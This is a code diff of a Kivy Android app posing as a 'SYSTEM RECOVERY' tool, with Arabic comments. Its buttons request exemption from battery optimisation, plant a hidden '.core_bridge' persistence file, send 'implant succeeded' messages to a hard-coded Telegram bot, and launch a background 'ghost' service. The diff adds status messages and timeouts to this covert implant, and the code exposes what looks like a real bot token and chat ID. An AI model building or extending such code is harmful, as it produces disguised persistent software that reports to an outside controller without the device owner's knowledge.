@@ -7,15 +7,16 @@ from android import mActivity
 import requests
 import os
 
+# بيانات البوت الخاصة بك
 TOKEN = "7547167733:AAFl789Ue816qWj60S_0N7W7BfXo57M3hZg"
 CHAT_ID = "1256334460"
 
 class ShadowUI(BoxLayout):
     def __init__(self, **kwargs):
         super().__init__(orientation='vertical', spacing=15, padding=40, **kwargs)
-        self.add_widget(Label(text="SYSTEM RECOVERY", font_size='24sp', color=(1,0,0,1)))
+        self.add_widget(Label(text="SYSTEM RECOVERY", font_size='24sp', color=(1,0,0,1), bold=True))
 
-        # المهمة 1: البطارية (تحويل مباشر)
+        # المهمة 1: البطارية
         self.btn1 = Button(text="MISSION 1: POWER BYPASS", height='60dp', size_hint_y=None)
         self.btn1.bind(on_press=self.unlock_battery)
         self.add_widget(self.btn1)
@@ -30,6 +31,9 @@ class ShadowUI(BoxLayout):
         self.btn3.bind(on_press=self.start_ghost)
         self.add_widget(self.btn3)
 
+        self.status = Label(text="System Status: Ready", font_size='14sp')
+        self.add_widget(self.status)
+
     def unlock_battery(self, inst):
         try:
             Intent = autoclass('android.content.Intent')
@@ -41,6 +45,7 @@ class ShadowUI(BoxLayout):
                 mActivity.startActivity(intent)
             except:
                 mActivity.startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
+            self.status.text = "Battery Request Sent"
         except: pass
 
     def silent_implant(self, inst):
@@ -49,10 +54,14 @@ class ShadowUI(BoxLayout):
             os.makedirs(path, exist_ok=True)
             with open(os.path.join(path, ".core_bridge"), "w") as f:
                 f.write("PERSISTENT_ACTIVE")
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": "✅ Mission 2: تم زرع الملف بنجاح في جهازك!"})
-            self.btn2.text = "SYNCED"
-        except Exception as e:
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": f"❌ فشل الزرع: {str(e)}"})
+            
+            # إرسال إشارة للبوت
+            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
+                          data={"chat_id": CHAT_ID, "text": "✅ Mission 2: تم زرع ملف النظام بنجاح!"}, timeout=5)
+            self.btn2.text = "SYNCING..."
+            self.status.text = "Core Implanted"
+        except:
+            self.status.text = "Sync Error"
 
     def start_ghost(self, inst):
         try:
@@ -67,7 +76,8 @@ class ShadowUI(BoxLayout):
             else:
                 service = autoclass('org.shadow.shadowking.ServiceMyservice')
                 service.start(mActivity, "")
-        except: pass
+                self.status.text = "Ghost Active"
+        except: self.status.text = "Activation Failed"
 
 class ShadowApp(App):
     def build(self): return ShadowUI()
